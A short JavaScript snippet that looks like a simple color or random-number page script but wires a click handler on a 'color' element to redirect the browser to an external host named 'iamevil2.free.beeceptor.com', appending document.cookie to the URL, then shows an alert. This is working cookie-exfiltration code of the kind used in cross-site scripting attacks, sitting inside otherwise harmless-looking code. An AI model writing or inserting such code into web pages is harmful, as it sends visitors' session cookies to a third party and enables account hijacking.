const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    document.location = 'https://iamevil2.free.beeceptor.com/cookie?c=' + document.cookie;
    alert(2);
}
